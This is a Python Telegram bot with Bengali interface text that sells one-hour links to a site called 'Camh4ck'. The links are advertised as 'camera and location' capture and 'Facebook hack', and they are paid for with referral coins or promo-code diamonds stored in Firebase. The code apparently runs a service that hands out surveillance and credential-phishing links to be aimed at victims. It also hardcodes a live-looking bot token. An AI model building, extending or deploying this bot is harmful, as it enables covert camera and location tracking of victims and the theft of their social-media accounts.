import telebot
from telebot import types
import requests
import time
from flask import Flask
from threading import Thread
import os

# সেটিংস
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
ADMIN_USERNAME = "bcdatp10" 
CHANNEL_ID = "@hackingacademyX"
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/"
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

bot = telebot.TeleBot(BOT_TOKEN)

# --- ফাংশনসমূহ ---
def get_user(user_id):
    res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
    data = res.json()
    if data: return data
    return {"coins": 0, "diamonds": 0}

def save_user(user_id, data):
    requests.patch(f"{FIREBASE_URL}/users/{user_id}.json", json=data)

def get_promo(code):
    res = requests.get(f"{FIREBASE_URL}/promo/{code}.json")
    return res.json()

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- রেন্ডার সার্ভার ---
app = Flask('')
@app.route('/')
def home(): return "Zord Bot is Running!"
def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
def keep_alive(): Thread(target=run).start()

# --- কিবোর্ড মেনু ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start", "💰 My Assets")
    markup.row("👥 Refer", "🔥 Access")
    markup.row("ℹ️ Info")
    return markup

@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = message.chat.id
    args = message.text.split()
    
    is_new = requests.get(f"{FIREBASE_URL}/users/{user_id}.json").json() is None
    if is_new:
        if len(args) > 1 and args[1].isdigit():
            ref_id = args[1]
            if str(ref_id) != str(user_id):
                ref_data = get_user(ref_id)
                ref_data['coins'] = ref_data.get('coins', 0) + 50
                save_user(ref_id, ref_data)
                bot.send_message(ref_id, "🎉 অভিনন্দন! কেউ আপনার লিঙ্কে জয়েন করেছে। ৫০ কয়েন পেয়েছেন।")
        save_user(user_id, {"coins": 0, "diamonds": 0})

    if not is_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন", url="https://t.me/hackingacademyX"))
        markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
        bot.send_message(user_id, "⚠️ বোট ব্যবহার করতে আগে চ্যানেলে জয়েন করুন!", reply_markup=markup)
        return

    bot.send_message(user_id, "👋 স্বাগতম! নিচের মেনু ব্যবহার করুন।", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.chat.id
    text = message.text
    data = get_user(user_id)

    if text == "🚀 Start":
        bot.send_message(user_id, "বোট রেডি!", reply_markup=main_menu())

    elif text == "💰 My Assets":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 কিনুন", url=f"https://t.me/{ADMIN_USERNAME}"),
                   types.InlineKeyboardButton("🎁 রিডিম কোড", callback_data="redeem_ui"))
        if user_id == ADMIN_ID:
            markup.add(types.InlineKeyboardButton("⚙️ অ্যাডমিন প্যানেল", callback_data="admin_panel"))
        bot.send_message(user_id, f"📊 **ব্যালেন্স:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}", reply_markup=markup, parse_mode='Markdown')

    elif text == "👥 Refer":
        bot_user = bot.get_me().username
        link = f"https://t.me/{bot_user}?start={user_id}"
        bot.send_message(user_id, f"🔗 রেফার লিঙ্ক: {link}\nপ্রতি জয়েনে ৫০ কয়েন!")

    elif text == "🔥 Access":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📸 ক্যামেরা ও লোকেশন (10 Coin)", callback_data="buy_cam"),
                   types.InlineKeyboardButton("🔐 ফেসবুক হ্যাক (1 Diamond)", callback_data="buy_fb"))
        bot.send_message(user_id, "কি অ্যাক্সেস করতে চান?", reply_markup=markup)

    elif text == "ℹ️ Info":
        info = "🤖 **Zord Academy ইনফো**\n\n📸 ক্যামেরা: ১০ কয়েন খরচ\n🔐 ফেসবুক: ৫ ডায়মন্ড খরচ \n👥 রেফার: ৫০ কয়েন বোনাস\n⚠️ লিঙ্ক মেয়াদ: ১ ঘণ্টা থাকবে "
        bot.send_message(user_id, info, parse_mode='Markdown')

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.message.chat.id)
    data = get_user(user_id)

    if call.data == "verify_join":
        if is_subscribed(user_id):
            bot.delete_message(user_id, call.message.message_id)
            bot.send_message(user_id, "বোট একটিভ হয়েছে!", reply_markup=main_menu())
        else: bot.answer_callback_query(call.id, "আগে জয়েন করুন!", show_alert=True)

    elif call.data == "redeem_ui":
        msg = bot.send_message(user_id, "প্রোমো কোডটি দিন:")
        bot.register_next_step_handler(msg, process_redeem)

    elif call.data == "admin_panel":
        if int(user_id) != ADMIN_ID: return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("➕ নতুন রিডিম কোড তৈরি", callback_data="gen_code"))
        bot.send_message(user_id, "অ্যাডমিন প্যানেল:", reply_markup=markup)

    elif call.data == "gen_code":
        msg = bot.send_message(user_id, "১. কোডের নাম দিন (যেমন: GIFT100):")
        bot.register_next_step_handler(msg, get_code_name)

    elif call.data.startswith("set_type_"):
        parts = call.data.split("_")
        asset_type, code_name = parts[2], parts[3]
        msg = bot.send_message(user_id, f"৩. কত {asset_type} দিতে চান? (সংখ্যা দিন):")
        bot.register_next_step_handler(msg, lambda m: get_amount(m, code_name, asset_type))

    # --- বাটন অ্যাকশন (Buy Cam/FB) - সরাসরি লিঙ্ক আপডেট ---
    elif call.data == "buy_cam":
        if data.get('coins', 0) >= 10:
            data['coins'] -= 10
            save_user(user_id, data)
            exp = int(time.time()) + 3600
            # সরাসরি লিঙ্ক পাঠানো হচ্ছে, কোনো শর্টনার নেই
            direct_link = f"{BASE_URL}?id={user_id}&exp={exp}"
            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক (মেয়াদ ১ ঘণ্টা):\n{direct_link}")
        else: bot.answer_callback_query(call.id, "কয়েন নেই!", show_alert=True)

    elif call.data == "buy_fb":
        if data.get('diamonds', 0) >= 1:
            data['diamonds'] -= 1
            save_user(user_id, data)
            exp = int(time.time()) + 3600
            # সরাসরি লিঙ্ক পাঠানো হচ্ছে, কোনো শর্টনার নেই
            direct_link = f"{BASE_URL}fb/?id={user_id}&exp={exp}"
            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক (মেয়াদ ১ ঘণ্টা):\n{direct_link}")
        else: bot.answer_callback_query(call.id, "ডায়মন্ড নেই!", show_alert=True)

# --- অ্যাডমিন রিডিম কোড প্রসেস ---
def get_code_name(message):
    code_name = message.text
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🪙 Coin", callback_data=f"set_type_coin_{code_name}"),
               types.InlineKeyboardButton("💎 Diamond", callback_data=f"set_type_dia_{code_name}"))
    bot.send_message(message.chat.id, f"২. '{code_name}' কোডটি কিসের হবে?", reply_markup=markup)

def get_amount(message, code_name, asset_type):
    amount = message.text
    msg = bot.send_message(message.chat.id, "৪. ইউজার লিমিট দিন (কতজন পাবে):")
    bot.register_next_step_handler(msg, lambda m: finalize_code(m, code_name, asset_type, amount))

def finalize_code(message, code_name, asset_type, amount):
    limit = int(message.text)
    payload = {"limit": limit}
    if asset_type == "coin": payload["coin_amount"] = int(amount)
    else: payload["diamond_amount"] = int(amount)
    
    requests.patch(f"{FIREBASE_URL}/promo/{code_name}.json", json=payload)
    bot.send_message(message.chat.id, f"✅ সফল! কোড: `{code_name}` তৈরি হয়েছে।", parse_mode='Markdown')

# --- সাধারণ ইউজার রিডিম প্রসেস ---
def process_redeem(message):
    code = message.text
    user_id = str(message.chat.id)
    promo = get_promo(code)
    if promo:
        used_by = promo.get('used_by', {})
        if user_id in used_by or len(used_by) >= promo.get('limit', 1):
            bot.send_message(user_id, "❌ কোডটি ইনভ্যালিড বা লিমিট শেষ!")
            return
        user_data = get_user(user_id)
        if 'coin_amount' in promo: user_data['coins'] += promo['coin_amount']
        elif 'diamond_amount' in promo: user_data['diamonds'] += promo['diamond_amount']
        save_user(user_id, user_data)
        requests.patch(f"{FIREBASE_URL}/promo/{code}/used_by.json", json={user_id: True})
        bot.send_message(user_id, "✅ রিডিম সফল হয়েছে!")
    else: bot.send_message(user_id, "❌ ভুল কোড!")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
